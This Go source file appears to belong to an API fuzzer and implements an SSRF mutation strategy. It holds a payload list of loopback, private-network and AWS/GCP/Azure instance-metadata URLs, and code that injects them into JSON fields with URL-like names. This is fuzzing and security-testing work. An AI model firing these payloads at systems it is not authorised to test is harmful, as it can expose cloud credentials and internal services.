package mutator

import (
	"math/rand"
	"strings"

	"shelob-ng/corpus"
)

// ssrfPayloads are URL values injected into body fields that look like
// URL inputs. Chosen to trigger server-side HTTP requests to internal
// addresses that would normally be unreachable from the outside.
var ssrfPayloads = []string{
	"http://127.0.0.1/",
	"http://localhost/",
	"http://0.0.0.0/",
	"http://[::1]/",
	"http://169.254.169.254/latest/meta-data/",          // AWS EC2 instance metadata
	"http://169.254.169.254/computeMetadata/v1/",        // GCP instance metadata
	"http://metadata.google.internal/computeMetadata/v1/", // GCP via hostname
	"http://169.254.169.254/metadata/instance",          // Azure instance metadata
	"http://192.168.0.1/",                               // common LAN gateway
	"http://10.0.0.1/",                                  // common internal network
	"http://127.0.0.1:8080/",
	"http://127.0.0.1:8888/",
	"http://127.0.0.1:9200/",  // Elasticsearch
	"http://127.0.0.1:6379/",  // Redis (will hang, but slow response = signal)
	"http://127.0.0.1:27017/", // MongoDB
}

// urlFieldNames are body field names that commonly hold URL values —
// the most likely candidates for SSRF if the server fetches them.
var urlFieldNames = []string{
	"url", "uri", "link", "href", "src",
	"api", "endpoint", "callback", "webhook",
	"redirect", "redirect_url", "redirect_uri",
	"service", "backend", "target", "host",
	"next", "return_url", "return",
	"mechanic_api", "api_url", "base_url",
	"fetch_url", "image_url", "avatar_url",
}

// ssrfMutator injects SSRF payload URLs into JSON body fields whose name
// suggests a URL value (urlFieldNames) or whose current value is a URL
// (starts with "http").
//
// Built-in strategy: always available, no external payload files needed.
// Returns StrategyNotApplicable when the body has no URL-like targets.
type ssrfMutator struct {
	rng *rand.Rand
}

func (s *ssrfMutator) Name() string { return "ssrf" }

func (s *ssrfMutator) Apply(entry *corpus.CorpusEntry) (*corpus.CorpusEntry, error) {
	obj, err := ParseJSONObject(entry.Body)
	if err != nil {
		return nil, StrategyNotApplicable
	}

	targets := collectURLTargets(obj)
	if len(targets) == 0 {
		return nil, StrategyNotApplicable
	}

	target := targets[s.rng.Intn(len(targets))]
	payload := ssrfPayloads[s.rng.Intn(len(ssrfPayloads))]

	if err := SetLeafString(obj, target, payload); err != nil {
		return nil, StrategyNotApplicable
	}
	body, err := MarshalBody(obj)
	if err != nil {
		return nil, StrategyNotApplicable
	}
	entry.Body = body
	return entry, nil
}

// collectURLTargets returns dotted key paths within obj whose name looks like
// a URL field or whose current value is already a URL.
func collectURLTargets(obj map[string]interface{}) []string {
	var targets []string
	collectURLTargetsRec(obj, "", &targets, 0)
	return targets
}

func collectURLTargetsRec(obj map[string]interface{}, prefix string, out *[]string, depth int) {
	if depth > 8 {
		return
	}
	for k, v := range obj {
		path := k
		if prefix != "" {
			path = prefix + "." + k
		}
		switch child := v.(type) {
		case string:
			if isURLFieldName(k) || strings.HasPrefix(child, "http://") || strings.HasPrefix(child, "https://") {
				*out = append(*out, path)
			}
		case map[string]interface{}:
			collectURLTargetsRec(child, path, out, depth+1)
		}
	}
}

// isURLFieldName reports whether name (case-insensitive) matches a known URL field.
func isURLFieldName(name string) bool {
	lower := strings.ToLower(name)
	for _, fn := range urlFieldNames {
		if lower == fn {
			return true
		}
	}
	// Suffix match: field names ending in _url, _uri, _link, _href, _endpoint.
	for _, suffix := range []string{"_url", "_uri", "_link", "_href", "_endpoint", "_api", "_callback"} {
		if strings.HasSuffix(lower, suffix) {
			return true
		}
	}
	return false
}
